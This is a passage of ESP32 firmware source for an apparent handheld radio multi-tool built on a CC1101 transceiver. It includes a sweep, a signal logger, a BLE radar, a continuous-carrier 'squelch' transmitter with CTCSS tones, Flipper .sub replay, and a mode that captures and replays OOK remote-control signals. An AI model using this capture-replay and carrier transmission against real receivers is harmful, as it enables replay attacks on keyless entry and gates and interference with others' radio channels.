            rfSquelchFirstDraw = true;
            delay(120);  // Consume button press
        }
    } else {
        // Normal mode: UP/DOWN for fine tuning (1 kHz steps = 0.001 MHz)
        if (isPressed(BTN_UP)) {
            rfLockedFrequencyMHz += 0.00100f;  // Changed from 0.00500f (5 kHz) to 0.00100f (1 kHz)
            if (rfLockedFrequencyMHz > 470.0f) rfLockedFrequencyMHz = 470.0f;
            rfLockedFrequencyMHz = lroundf(rfLockedFrequencyMHz * 10000.0f) / 10000.0f;
            if (active) lastUpdate = 0;
            rfSquelchFirstDraw = true;
        }
        if (isPressed(BTN_DOWN)) {
            rfLockedFrequencyMHz -= 0.00100f;  // Changed from 0.00500f (5 kHz) to 0.00100f (1 kHz)
            if (rfLockedFrequencyMHz < 300.0f) rfLockedFrequencyMHz = 300.0f;
            rfLockedFrequencyMHz = lroundf(rfLockedFrequencyMHz * 10000.0f) / 10000.0f;
            if (active) lastUpdate = 0;
            rfSquelchFirstDraw = true;
        }
        
        // SELECT button handling - simplified logic
        bool selectHeld = (companion_readButtonState(BTN_SELECT) == LOW);

        if (selectHeld) {
            // Track when button was first pressed
            if (selectPressStart == 0) {
                selectPressStart = now;
                selectWasDown = true;
            }
            
            // Start TX after holding for 220ms
            if ((now - selectPressStart > 220) && !active) {
                active = true;
                lastUpdate = 0;  // force re-init
                rfSquelchFirstDraw = true;
                Serial.println("SQUELCH: TX START");
            }
        } else {
            // Button released
            if (selectWasDown) {
                unsigned long pressDuration = now - selectPressStart;
                
                if (active) {
                    // Was transmitting - stop
                    Serial.println("SQUELCH: TX STOP - Button released");
                    active = false;
                    
                    // Restore normal CC1101 settings immediately
                    cc1101Strobe(CC1101_SIDLE);
                    delayMicroseconds(200);
                    cc1101Strobe(CC1101_SFTX);  // Flush TX FIFO
                    
                    // Resume WiFi task
                    if (wifiTaskHandle != NULL) {
                        vTaskResume(wifiTaskHandle);
                    }
                    
                    // Resume BLE task
                    if (bleScanTaskHandle != NULL) {
                        vTaskResume(bleScanTaskHandle);
                    }
                    
                    // Release SPI isolation and restore display
                    endSPIOperation(true, false);
                    
                    // Restore base CC1101 config (strong settings for other apps)
                    cc1101ConfigureBase();
                    cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
                    cc1101EnterRx();
                    
                    lastUpdate = 0;
                    rfSquelchFirstDraw = true;
                } else if (pressDuration < 220) {
                    // Quick press - enter digit edit mode
                    digitEditMode = true;
                    selectedDigit = 0;
                    rfSquelchFirstDraw = true;
                }
                
                selectPressStart = 0;
                selectWasDown = false;
            }
        }
        
        // Note: LEFT button for back is handled by global handler
    }

    // Squelch activation - continuous modulated transmission
    if (active) {
        // Initial configuration (only once when activated)
        if (lastUpdate == 0) {
            // 🔥 CRITICAL: FULL EXECUTION ISOLATION
            // Suspend ALL background services that could interrupt timing:
            // - Display updates (TFT SPI)
            // - WiFi scanning (background task on Core 0)
            // - BLE scanning (background task on Core 0)
            // - SD card access (shared SPI)
            // This eliminates ALL jitter sources for stable tone generation
            
            beginSPIOperation(true);  // Proper SPI isolation + display suspension
            
            // Disable WiFi promiscuous mode callback (can fire even with task suspended)
            esp_wifi_set_promiscuous_rx_cb(NULL);
            esp_wifi_set_promiscuous(false);
            
            // Suspend WiFi task if running
            if (wifiTaskHandle != NULL) {
                vTaskSuspend(wifiTaskHandle);
            }
            
            // Suspend BLE task if running
            if (bleScanTaskHandle != NULL) {
                vTaskSuspend(bleScanTaskHandle);
            }
            
            // Apply global PPM correction (same as cc1101SetFrequencyMHz)
            float correctedFreq = cc1101ApplyFrequencyCorrection(rfLockedFrequencyMHz);
            uint32_t freqWord = (uint32_t)((correctedFreq * 65536.0f / 26.0f) + 0.5f);
            cc1101Strobe(CC1101_SIDLE);
            cc1101WriteReg(CC1101_FREQ2, (freqWord >> 16) & 0xFF);
            cc1101WriteReg(CC1101_FREQ1, (freqWord >> 8) & 0xFF);
            cc1101WriteReg(CC1101_FREQ0, freqWord & 0xFF);

            uint8_t paValue = 0x12;
            if (sqPower >= 8) paValue = 0xC0;
            else if (sqPower >= 4) paValue = 0x84;
            else if (sqPower >= 0) paValue = 0x60;
            else if (sqPower >= -4) paValue = 0x34;
            else if (sqPower >= -8) paValue = 0x1D;
            uint8_t paTable[8] = {paValue, paValue, paValue, paValue, paValue, paValue, paValue, paValue};
            cc1101WriteBurst(CC1101_PATABLE, paTable, 8);

            // Configure for FM-compatible continuous transmission
            // CRITICAL: Use hardware FSK modulation, not manual frequency writes
            cc1101WriteReg(CC1101_FSCTRL1,  0x08);  // IF frequency
            cc1101WriteReg(CC1101_FSCTRL0,  0x00);
            cc1101WriteReg(CC1101_MDMCFG4,  0xE5);  // Slightly wider bandwidth for audio (not too narrow)
            cc1101WriteReg(CC1101_MDMCFG3,  0x83);  // Low data rate (~2-5 kbps for audio)
            cc1101WriteReg(CC1101_MDMCFG2,  0x02);  // 2-FSK (closest to FM), no sync
            cc1101WriteReg(CC1101_MDMCFG1,  0x22);  // FEC disabled, 4 preamble bytes
            cc1101WriteReg(CC1101_MDMCFG0,  0xF8);  // Channel spacing
            cc1101WriteReg(CC1101_DEVIATN,  0x05);  // CRITICAL: ~2-3 kHz deviation (true narrowband FM)
            cc1101WriteReg(CC1101_PKTCTRL1, 0x04);  // No address check
            cc1101WriteReg(CC1101_PKTCTRL0, 0x00);  // CRITICAL: No packet mode - pure continuous async TX
            cc1101WriteReg(CC1101_IOCFG0,   0x0D);  // GDO0 = serial data output
            cc1101WriteReg(CC1101_MCSM1,    0x0F);  // Stay in TX after packet
            cc1101WriteReg(CC1101_MCSM0,    0x18);  // Auto-calibrate, stay in TX
            cc1101WriteReg(CC1101_FREND0,   0x10);  // PA power
            cc1101WriteReg(CC1101_FSCAL3,   0xE9);  // Frequency synthesizer calibration
            cc1101WriteReg(CC1101_FSCAL2,   0x2A);
            cc1101WriteReg(CC1101_FSCAL1,   0x00);
            cc1101WriteReg(CC1101_FSCAL0,   0x1F);
            cc1101WriteReg(CC1101_TEST2,    0x81);
            cc1101WriteReg(CC1101_TEST1,    0x35);
            cc1101WriteReg(CC1101_TEST0,    0x09);

            cc1101Strobe(CC1101_SCAL);
            delay(3);

            // Flush TX FIFO and start transmission
            cc1101Strobe(CC1101_SFTX);  // Flush TX FIFO
            cc1101Strobe(CC1101_STX);   // Start TX
            delayMicroseconds(150);
            lastUpdate = now;
        }

        // HARDWARE FSK TONE GENERATION - Use TXFIFO data stream with proper timing
        // Full execution isolation active (WiFi/BLE tasks suspended, SPI locked)
        else {
            static unsigned long lastToggleUs = 0;
            static bool toneState = false;
            static unsigned long cachedHalfPeriodUs = 500;  // Cache to avoid switch in loop
            static int lastToneMode = -1;
            static unsigned long lastWatchdogFeed = 0;
            
            // Update cached period ONLY when tone mode changes (outside timing-critical path)
            if (toneMode != lastToneMode) {
                lastToneMode = toneMode;
                // Pre-calculate period once, not in every loop iteration
                if (toneMode == 0) cachedHalfPeriodUs = 500;       // 1000 Hz
                else if (toneMode == 1) cachedHalfPeriodUs = 7463; // 67 Hz CTCSS
                else if (toneMode == 2) cachedHalfPeriodUs = 5000; // 100 Hz CTCSS
                else if (toneMode == 3) cachedHalfPeriodUs = 3546; // 141.3 Hz CTCSS
                else cachedHalfPeriodUs = 2463;                    // 203.5 Hz CTCSS
            }
            
            unsigned long nowUs = micros();
            
            // Feed watchdog every 50ms to prevent reset during long TX
            if (now - lastWatchdogFeed > 50) {
                yield();  // Feed watchdog
                esp_task_wdt_reset();  // Explicitly reset task watchdog
                lastWatchdogFeed = now;
            }
            
            // 🔥 TIGHT LOOP - minimal branching, no extra SPI reads
            // No critical section - causes watchdog issues on long TX
            // Task suspension + tight loop provides sufficient isolation
            if (nowUs - lastToggleUs >= cachedHalfPeriodUs) {
                lastToggleUs = nowUs;
                toneState = !toneState;
                
                // Direct FIFO write - no read check (trust hardware flow control)
                // CC1101 FIFO is 64 bytes, we're writing 1 byte per ~500us minimum
                // At 1kHz: 2 bytes/ms = 2000 bytes/sec, FIFO drains faster than we fill
                uint8_t txByte = toneState ? 0xF0 : 0x0F;
                cc1101WriteReg(CC1101_TXFIFO, txByte);
            }
            
            lastUpdate = now;
        }
    }
}

void runRFSignalCapture() {
    if (!prepareCC1101PassiveTool(rfLockedFrequencyMHz, rfCaptureFirstDraw)) {
        drawRFUnavailable("Signal Capture", "Threshold activity log");
        delay(80);
        return;
    }

    if (rfCaptureFirstDraw) {
        drawRFScreenHeader("Signal Capture", "Thresholded RF events");
        tft.drawRect(12, 122, 216, 120, tft.color565(58, 58, 58));
        tft.setTextColor(tft.color565(160, 160, 160));
        tft.setCursor(12, 258);
        tft.print("UP/DN threshold");
        tft.setCursor(12, 274);
        tft.print("SEL rec  HOLD-R tune/band");
        resetRFMonitorHistory();
        tft.fillRect(14, 124, 212, 116, ILI9341_BLACK);
        rfCaptureFirstDraw = false;
    }

    if (rfLastSampleMs == 0 || millis() - rfLastSampleMs >= 40) {
        rfLastSampleMs = millis();
        if (!rfCaptureRecording) cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
        int rssi = cc1101ReadRSSI();
        rfCurrentRSSI = rssi;
        orionToolsServiceRfCsv("cap", rfLockedFrequencyMHz, rssi);
        int active = (rssi >= rfCaptureThreshold) ? 1 : 0;
        if (active) rfCaptureHits++;

        rfCaptureHistory[rfCaptureHistoryIndex] = active;
        rfCaptureHistoryIndex = (rfCaptureHistoryIndex + 1) % RF_HISTORY_POINTS;
        if (rfCaptureHistoryCount < RF_HISTORY_POINTS) rfCaptureHistoryCount++;

        // Draw RSSI history only when not recording (GDO0 capture draws its own)
        if (!rfCaptureRecording) {
            int x = 14 + rfCaptureGraphColumn;
            tft.fillRect(x, 124, 1, 116, ILI9341_BLACK);
            if (active) tft.drawFastVLine(x, 130, 104, ILI9341_WHITE);
            else        tft.drawPixel(x, 234, tft.color565(60, 60, 60));
            rfCaptureGraphColumn = (rfCaptureGraphColumn + 1) % 212;
        }
    }

    // GDO0 pulse capture when recording - exact timing via pulseIn
    if (rfCaptureRecording && rfCaptureRecordedCount < RF_CAPTURE_RECORD_POINTS) {
        // Read pulses directly - filter noise by minimum width (50µs)
        // No RSSI gate - it was blocking real signals
        unsigned long highUs = pulseIn(CC1101_GDO0, HIGH, 100000UL);
        unsigned long lowUs  = pulseIn(CC1101_GDO0, LOW,  100000UL);

        if (highUs >= 50 && highUs < 100000UL) {
            int pulse = (int)constrain((long)highUs, 1L, 32767L);
            rfCaptureRecordedHistory[rfCaptureRecordedCount++] = pulse;
            int x = 14 + rfCaptureGraphColumn;
            tft.fillRect(x, 124, 1, 116, ILI9341_BLACK);
            tft.drawFastVLine(x, 130, 104, ILI9341_WHITE);
            rfCaptureGraphColumn = (rfCaptureGraphColumn + 1) % 212;
            rfCaptureHits++;
        }
        if (lowUs >= 50 && lowUs < 100000UL && rfCaptureRecordedCount < RF_CAPTURE_RECORD_POINTS) {
            int pulse = -(int)constrain((long)lowUs, 1L, 32767L);
            rfCaptureRecordedHistory[rfCaptureRecordedCount++] = pulse;
            int x = 14 + rfCaptureGraphColumn;
            tft.fillRect(x, 124, 1, 116, ILI9341_BLACK);
            tft.drawPixel(x, 234, tft.color565(60, 60, 60));
            rfCaptureGraphColumn = (rfCaptureGraphColumn + 1) % 212;
        }

        if (rfCaptureRecordedCount >= RF_CAPTURE_RECORD_POINTS) {
            finalizeRFSignalCaptureRecording();
        }
    }

    if (rfCaptureWindowStart == 0) rfCaptureWindowStart = millis();
    if (millis() - rfCaptureWindowStart >= 1000) {
        if (rfCaptureHits > rfCapturePeakHits) rfCapturePeakHits = rfCaptureHits;
        rfCaptureHits = 0;
        rfCaptureWindowStart = millis();
    }

    drawRFStatLine(74, String("Freq ") + String(rfLockedFrequencyMHz, 2),
                   String(rfCurrentRSSI) + " dBm");
    drawRFStatLine(86,
                   rfCaptureRecording
                       ? (String("Rec ") + String(rfCaptureRecordedCount) + "/" + String(RF_CAPTURE_RECORD_POINTS))
                       : (String("Thr ") + String(rfCaptureThreshold) + " dBm"),
                   String("Pk ") + String(rfCapturePeakHits) + "/s");

    String footerLine1;
    String footerLine2;
    if (rfCaptureRecording) {
        footerLine1 = "SELECT stop/save";
        footerLine2 = "Recording window active";
    } else if (rfCaptureHasRecording) {
        footerLine1 = "SELECT record new";
        footerLine2 = "Last window saved as .sub";
    } else {
        footerLine1 = "SELECT start / HOLD-R alt";
        footerLine2 = "R+SEL/L MHz  R+UP/DN band";
    }
    drawRFFooterLine(0, 258, footerLine1);
    drawRFFooterLine(1, 274, footerLine2);

    if (rfCaptureStatusUntil > millis()) {
        tft.fillRect(140, 258, 88, 10, ILI9341_BLACK);
        tft.setTextColor(tft.color565(170, 170, 170));
        tft.setCursor(140, 258);
        tft.print(rfCaptureStatus);
    } else if (rfCaptureStatus.length() > 0) {
        tft.fillRect(140, 258, 88, 10, ILI9341_BLACK);
        rfCaptureStatus = "";
    }
}

void runRFSweep() {
    if (ESP.getFreeHeap() < 78000UL ||
        heap_caps_get_largest_free_block(MALLOC_CAP_8BIT) < 38000UL) {
        markToolInitFailure(RF_FREQUENCY_SWEEP, "Low memory", 6000UL);
        drawToolBlockedScreen("RF Sweep", "Low memory", "Close other tools, then retry");
        delay(80);
        return;
    }

    if (!prepareCC1101PassiveTool(rfLockedFrequencyMHz, rfSweepFirstDraw)) {
        markToolInitFailure(RF_FREQUENCY_SWEEP, "CC1101 offline", 6000UL);
        rfDiagLog("RF Sweep blocked: CC1101 offline");
        drawRFUnavailable("Frequency Sweep", "Wideband rolling sweep");
        delay(80);
        return;
    }

    static unsigned long lastSpectrumRefresh = 0;
    static uint8_t waterfallDivider = 0;

    if (rfSweepFirstDraw) {
        rfDiagLog(String("RF Sweep enter band=") + rfBandPresets[rfBandIndex].label +
                  " tune=" + String(rfLockedFrequencyMHz, 3));
        displayUpdatesSuspended = false;
        drawRFScreenHeader("Frequency Sweep", "Tuned sweep + waterfall");
        tft.drawRect(RF_SWEEP_GRAPH_X - 2, RF_SWEEP_GRAPH_Y - 2, RF_SWEEP_GRAPH_W + 4, RF_SWEEP_GRAPH_H + 4, tft.color565(58, 58, 58));
        tft.drawRect(RF_SWEEP_WATERFALL_X - 2, RF_SWEEP_WATERFALL_Y - 2, RF_SWEEP_WATERFALL_W + 4, RF_SWEEP_WATERFALL_H + 4, tft.color565(58, 58, 58));
        tft.fillRect(RF_SWEEP_GRAPH_X, RF_SWEEP_GRAPH_Y, RF_SWEEP_GRAPH_W, RF_SWEEP_GRAPH_H, ILI9341_BLACK);
        tft.fillRect(RF_SWEEP_WATERFALL_X, RF_SWEEP_WATERFALL_Y, RF_SWEEP_WATERFALL_W, RF_SWEEP_WATERFALL_H, ILI9341_BLACK);
        drawRFFooterLine(0, 272, "UP/DN fine tune  LEFT back");
        drawRFFooterLine(1, 286, "HOLD-R SEL/L MHz  UP/DN band");
        resetRFSweepLevels();
        lastSpectrumRefresh = 0;
        waterfallDivider = 0;
        renderRFSweepSpectrum(true);
        pushRFSweepWaterfallRow();
        rfSweepFirstDraw = false;
        clearToolGuardFailure(RF_FREQUENCY_SWEEP);
    }

    bool completedSweep = false;
    const uint32_t now = millis();
    const uint32_t sweepBatchIntervalMs = 4;
    const uint8_t sweepBatchPoints = 24;
    const uint32_t liveRefreshMs = 20;
    const uint32_t pausedRefreshMs = 120;

    if (!rfSweepPaused && (rfLastSampleMs == 0 || now - rfLastSampleMs >= sweepBatchIntervalMs)) {
        rfLastSampleMs = now;

        for (int i = 0; i < sweepBatchPoints; i++) {
            float freq = rfSweepFrequencyForIndex(rfSweepCursor);
            int rssi = cc1101MeasureSweepRSSI(freq, rfSweepCursor);
            uint8_t rawLevel = rfLevelFromRSSI(rssi);
            uint8_t floorLevel = rfSweepNoiseFloor[rfSweepCursor];
            if (floorLevel == 0) {
                floorLevel = rawLevel;
            } else if (rawLevel <= floorLevel) {
                floorLevel = rawLevel;
            } else {
                // Let the noise floor rise slowly so random bumps do not become "signals".
                floorLevel = (uint8_t)((floorLevel * 15 + rawLevel) / 16);
            }
            rfSweepNoiseFloor[rfSweepCursor] = floorLevel;

            int aboveNoise = (int)rawLevel - (int)floorLevel - RF_SWEEP_NOISE_MARGIN;
            uint8_t measuredLevel = (aboveNoise <= 0)
                ? 0
                : (uint8_t)constrain(aboveNoise * RF_SWEEP_SIGNAL_GAIN, 0, 100);

            if (rfSweepWarmupPasses > 0) {
                measuredLevel = 0;
            }

            uint8_t previousLevel = rfSweepLevels[rfSweepCursor];
            if (measuredLevel >= previousLevel) {
                rfSweepLevels[rfSweepCursor] = measuredLevel;
            } else {
                rfSweepLevels[rfSweepCursor] = (uint8_t)((previousLevel * 3 + measuredLevel) / 4);
            }
            if (rfSweepWarmupPasses == 0 && rfSweepLevels[rfSweepCursor] > rfSweepPeakHold[rfSweepCursor]) {
                rfSweepPeakHold[rfSweepCursor] = rfSweepLevels[rfSweepCursor];
            }
            rfCurrentRSSI = rssi;

            rfSweepCursor++;
            if (rfSweepCursor >= RF_SWEEP_POINTS) {
                rfSweepCursor = 0;
                completedSweep = true;
                break;
            }

            if ((i & 0x03) == 0x03) {
                yield();
            }
        }
    }

    if (completedSweep) {
        if (rfSweepWarmupPasses > 0) {
            rfSweepWarmupPasses--;
        } else {
            orionToolsDecayRfPeakHold(rfSweepPeakHold, rfSweepLevels, RF_SWEEP_POINTS, 2);
            for (int j = 0; j < RF_SWEEP_POINTS; j++) {
                if (rfSweepLevels[j] > rfSweepPeakHold[j]) {
                    rfSweepPeakHold[j] = rfSweepLevels[j];
                }
            }
        }
        rfSweepStrongestRSSI = -120;
        rfSweepStrongestMHz = rfBandPresets[rfBandIndex].startMHz;
        for (int i = 0; i < RF_SWEEP_POINTS; i++) {
            int pseudoRssi = map(rfSweepLevels[i], 0, 100, -110, -40);
            if (pseudoRssi >= rfSweepStrongestRSSI) {
                rfSweepStrongestRSSI = pseudoRssi;
                rfSweepStrongestMHz = rfSweepFrequencyForIndex(i);
            }

            if ((i & 0x0F) == 0x0F) {
                yield();
            }
        }
        orionToolsServiceRfCsv("sweep", rfLockedFrequencyMHz, rfSweepStrongestRSSI);
        orionToolsRssiToneTick(rfSweepStrongestRSSI);
    }

    String sweepMode = rfSweepPaused ? "Paused" : (rfSweepWarmupPasses > 0 ? "Warmup" : "Sweep");
    drawRFStatLine(74, String("Band ") + rfBandPresets[rfBandIndex].label, sweepMode);
    drawRFStatLine(86, String("Tune ") + String(rfLockedFrequencyMHz, 2),
                   String("Peak ") + String(rfSweepStrongestMHz, 2));

    bool shouldRefreshSpectrum = completedSweep;
    if (!shouldRefreshSpectrum && !rfSweepPaused && now - lastSpectrumRefresh >= liveRefreshMs) {
        shouldRefreshSpectrum = true;
    }
    if (!shouldRefreshSpectrum && rfSweepPaused && now - lastSpectrumRefresh >= pausedRefreshMs) {
        shouldRefreshSpectrum = true;
    }

    if (shouldRefreshSpectrum) {
        renderRFSweepSpectrum(false);
        lastSpectrumRefresh = now;
    }

    if (completedSweep) {
        waterfallDivider++;
        if (waterfallDivider >= 2) {
            pushRFSweepWaterfallRow();
            waterfallDivider = 0;
        }
    }
}

void runRFTransmit() {
    if (!prepareCC1101ActiveTool("RF Transmit", rfTransmitFirstDraw)) {
        drawRFUnavailable("RF Transmit", "CC1101 burst output");
        delay(80);
        return;
    }

    static unsigned long lastUiRefresh = 0;
    static String lastModeLine = "";
    static String lastSourceLine = "";
    static String lastFreqLine = "";
    static String lastFooterLine = "";
    static int lastMeterWidth = -1;
    static bool lastMeterActive = false;
    const unsigned long now = millis();

    if (rfTransmitFirstDraw) {
        drawRFScreenHeader("RF Transmit", rfSubLoaded ? "Flipper .sub replay" : "Hold SELECT = continuous carrier");
        tft.drawRect(12, 118, 216, 118, tft.color565(58, 58, 58));
        tft.fillRect(14, 120, 212, 114, ILI9341_BLACK);
        tft.setTextColor(tft.color565(160, 160, 160));
        tft.setCursor(12, 258);
        tft.print("UP/DN fine  HOLD-R alt");
        tft.setCursor(12, 274);
        tft.print(rfSubLoaded ? "HOLD SEL replay LEFT back" : "HOLD SEL carrier LEFT back");
        rfTransmitFirstDraw = false;
        lastUiRefresh = 0;
        lastModeLine = "";
        lastSourceLine = "";
        lastFreqLine = "";
        lastFooterLine = "";
        lastMeterWidth = -1;
        lastMeterActive = false;
    }

    if (rfSubLoaded && rfTransmitActive) {
        if (!transmitLoadedSubFile()) {
            stopRFTransmitNow();
            rfTransmitStatus = "Replay failed";
            rfTransmitStatusUntil = millis() + 1800;
        } else {
            rfTransmitLastSendMs = millis();
        }
    }

    if (rfTransmitStatusUntil > 0 && millis() > rfTransmitStatusUntil) {
        rfTransmitStatusUntil = 0;
        rfTransmitStatus = "";
    }

    if (!rfTransmitFirstDraw && (now - lastUiRefresh) < 85) {
        return;
    }
    lastUiRefresh = now;

    drawRFStatLine(74, String("Band ") + rfBandLabel(),
                   rfSubLoaded ? "SUB" : (rfTransmitActive ? "Carrier" : "Idle"));
    drawRFStatLine(86, String("Tx ") + String(rfLockedFrequencyMHz, 2),
                   rfSubLoaded ? (String("Frames ") + String(rfTransmitCount))
                               : (rfTransmitActive ? "Release SEL to stop" : "Hold SEL to start"));

    String modeLine = rfSubLoaded
        ? (rfTransmitActive ? "Replaying" : "Hold To Replay")
        : (rfTransmitActive ? "Carrier On" : "Hold For Carrier");
    if (modeLine != lastModeLine) {
        tft.fillRect(22, 136, 186, 20, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(40, 138);
        tft.print(modeLine);
        lastModeLine = modeLine;
    }

    String line2 = rfSubLoaded ? rfSubLoadedName : "CC1101 held OOK carrier";
    if (line2.length() > 28) line2 = line2.substring(0, 28);
    if (line2 != lastSourceLine) {
        tft.fillRect(16, 160, 208, 12, ILI9341_BLACK);
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(170, 170, 170));
        tft.setCursor(18, 160);
        tft.print(line2);
        lastSourceLine = line2;
    }

    String freqLine;
    if (rfSubLoaded) {
        freqLine = String("File ") + String(rfSubFrequencyHz / 1000000.0f, 2) +
                   "  Tx " + String(rfLockedFrequencyMHz, 2);
    } else {
        freqLine = String("Band ") + rfBandLabel() + "  Step " +
                   String(rfBandPresets[rfBandIndex].tuneStepMHz, 2);
    }
    if (freqLine != lastFreqLine) {
        tft.fillRect(16, 174, 208, 12, ILI9341_BLACK);
        tft.setCursor(18, 174);
        tft.print(freqLine);
        lastFreqLine = freqLine;
    }

    int meterWidth = rfTransmitActive ? 212 : 0;
    uint16_t meterColor = rfTransmitActive ? ILI9341_WHITE : tft.color565(90, 90, 90);
    if (meterWidth != lastMeterWidth || rfTransmitActive != lastMeterActive) {
        tft.fillRect(14, 196, 212, 16, ILI9341_BLACK);
        if (meterWidth > 0) {
            tft.fillRect(14, 196, meterWidth, 16, meterColor);
        }
        tft.drawRect(14, 196, 212, 16, tft.color565(72, 72, 72));
        lastMeterWidth = meterWidth;
        lastMeterActive = rfTransmitActive;
    }

    String footer = rfSubLoaded
        ? (rfTransmitStatus.length() > 0 ? rfTransmitStatus : (rfTransmitActive ? "Release SELECT to stop" : "Hold SELECT / HOLD-R alt"))
        : (rfTransmitStatus.length() > 0 ? rfTransmitStatus : (rfTransmitActive ? "Release SELECT to stop carrier" : "Hold SELECT / HOLD-R alt"));
    if (footer.length() > 31) footer = footer.substring(0, 31);
    if (footer != lastFooterLine) {
        tft.fillRect(14, 218, 212, 12, ILI9341_BLACK);
        tft.setTextColor(tft.color565(160, 160, 160));
        tft.setCursor(14, 218);
        tft.print(footer);
        lastFooterLine = footer;
    }
}

// ===== RF REPLAY MODE =====
// Phase 1 (LISTEN): CC1101 in RX, GDO0 as input. Captures raw OOK pulses via pulseIn.
// Phase 2 (REPLAY): CC1101 in TX, bit-bangs the captured pulses back out via GDO0.
// SELECT while listening = capture one burst. SELECT while captured = replay it.
void runRFReplay() {
    if (!prepareCC1101PassiveTool(rfLockedFrequencyMHz, rfReplayFirstDraw)) {
        drawRFUnavailable("Remote Capture", "CC1101 not ready");
        delay(80);
        return;
    }

    // ---- First draw / mode entry ----
    if (rfReplayFirstDraw) {
        drawRFScreenHeader("Remote Capture", "Capture & replay OOK signals");
        tft.drawRect(12, 118, 216, 118, tft.color565(58, 58, 58));
        tft.fillRect(14, 120, 212, 114, ILI9341_BLACK);
        tft.setTextColor(tft.color565(160, 160, 160));
        tft.setCursor(12, 258);
        tft.print("UP/DN fine  HOLD-R alt");
        tft.setCursor(12, 274);
        tft.print("RIGHT reset  HOLD-R MHz");
        rfReplayFirstDraw = false;

        if (!rfReplayListening) {
            cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
            cc1101EnterRx();
            pinMode(CC1101_GDO0, INPUT);
            rfReplayListening = true;
        }
    }

    // ---- Status timeout ----
    if (rfReplayStatusUntil > 0 && millis() > rfReplayStatusUntil) {
        rfReplayStatusUntil = 0;
        rfReplayStatus = "";
    }

    // ---- Draw stats ----
    drawRFStatLine(74,
        String("Freq ") + String(rfLockedFrequencyMHz, 3),
        rfReplayHasCapture ? "CAPTURED" : "Listening");
    drawRFStatLine(86,
        rfReplayHasCapture
            ? (String("Pulses: ") + String(rfReplayRawCount))
            : "Point at transmitter",
        rfReplayHasCapture
            ? (String("Val: ") + String(rfReplayCapturedValue))
            : "press SELECT to capture");

    // ---- Draw value ----
    static unsigned long lastValDrawn = 0xFFFFFFFF;
    static int lastCountDrawn = -1;
    if (rfReplayFirstDraw) {
        lastValDrawn = 0xFFFFFFFF;
        lastCountDrawn = -1;
    }
    if (rfReplayCapturedValue != lastValDrawn || rfReplayRawCount != lastCountDrawn) {
        tft.fillRect(14, 160, 212, 40, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(rfReplayHasCapture ? ILI9341_GREEN : tft.color565(80, 80, 80));
        tft.setCursor(18, 162);
        tft.print(rfReplayHasCapture ? String(rfReplayCapturedValue) : "No capture");
        if (rfReplayHasCapture) {
            tft.setTextSize(1);
            tft.setTextColor(tft.color565(140, 140, 140));
            tft.setCursor(18, 182);
            tft.print(String(rfReplayRawCount) + " pulses  " + String(rfReplayCapturedBits) + " bits");
        }
        lastValDrawn = rfReplayCapturedValue;
        lastCountDrawn = rfReplayRawCount;
    }

    // ---- Footer ----
    String footer = rfReplayStatus.length() > 0
        ? rfReplayStatus
        : (rfReplayHasCapture ? "HOLD SELECT replay  RIGHT reset" : "SELECT capture  RIGHT preset");
    tft.fillRect(14, 218, 212, 12, ILI9341_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(tft.color565(160, 160, 160));
    tft.setCursor(14, 218);
    tft.print(footer);
}

void drawBLERadar() {
    if (!bleRadarFirstDraw && !bleRadarNeedsRedraw) {
        return;
    }

    const uint16_t bg = ILI9341_BLACK;
    const uint16_t accent = tft.color565(236, 236, 236);
    const uint16_t accentSoft = tft.color565(190, 190, 190);
    const uint16_t success = ILI9341_WHITE;
    const uint16_t textSoft = tft.color565(160, 160, 160);
    const uint16_t lineColor = tft.color565(52, 52, 52);
    const uint16_t dotDim = tft.color565(112, 112, 112);
    const int centerX = 78;
    const int centerY = 148;
    const int maxRadius = 62;

    if (bleRadarFirstDraw) {
        tft.fillRect(0, 20, 240, 300, bg);
        tft.drawFastHLine(10, 68, 220, lineColor);
        tft.drawFastVLine(146, 80, 136, lineColor);

        tft.setTextSize(2);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(18, 34);
        tft.print("BLE Radar");

        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 52);
        tft.print("Nearby signal field");
        tft.setCursor(12, 240);
        tft.print("Focus");
        tft.setCursor(12, 255);
        tft.print("Hint");
        tft.setCursor(12, 270);
        tft.print("SEL strongest  LEFT back");

        bleRadarFirstDraw = false;
    }

    bleRadarVisibleCount = min(bleDeviceCount, BLE_RADAR_MAX_DEVICES);
    int focusedIndex = findBLEDeviceByMAC(bleFocusedMAC);

    tft.fillRect(150, 36, 70, 18, bg);
    tft.fillRoundRect(152, 38, 66, 16, 7, tft.color565(230, 230, 230));
    tft.setTextSize(1);
    tft.setTextColor(ILI9341_BLACK);
    tft.setCursor(164, 43);
    tft.print(bleRadarVisibleCount);
    tft.print(" seen");

    tft.fillCircle(centerX, centerY, maxRadius + 6, tft.color565(10, 10, 10));
    tft.fillCircle(centerX, centerY, maxRadius + 3, tft.color565(16, 16, 16));
    tft.fillCircle(centerX, centerY, maxRadius, ILI9341_BLACK);

    for (int ring = 1; ring <= 3; ring++) {
        int radius = (maxRadius * ring) / 3;
        tft.drawCircle(centerX, centerY, radius, lineColor);
    }

    tft.drawFastHLine(centerX - maxRadius, centerY, maxRadius * 2, lineColor);
    tft.drawFastVLine(centerX, centerY - maxRadius, maxRadius * 2, lineColor);
    tft.fillCircle(centerX, centerY, 4, success);
    tft.fillCircle(centerX, centerY, 2, accent);

    float sweepAngle = (millis() % 3800UL) / 3800.0f * 6.2831853f;
    for (int step = 0; step < maxRadius; step++) {
        float fade = 1.0f - (step / (float)maxRadius);
        uint16_t sweepColor = tft.color565(
            (uint8_t)(20 + (56 * fade)),
            (uint8_t)(20 + (56 * fade)),
            (uint8_t)(20 + (56 * fade))
        );
        int sx = centerX + cosf(sweepAngle) * step;
        int sy = centerY - sinf(sweepAngle) * step;
        tft.drawPixel(sx, sy, sweepColor);
    }

    for (int i = 0; i < bleRadarVisibleCount; i++) {
        float smoothedRSSI = getSmoothedRadarRSSI(String(bleMACs[i]), bleRSSI[i]);
        float normalized = (clampBLEFloat(-smoothedRSSI, 30.0f, 90.0f) - 30.0f) / 60.0f;
        bool focused = strlen(bleFocusedMAC) > 0 && strcmp(bleMACs[i], bleFocusedMAC) == 0;
        float radius = focused
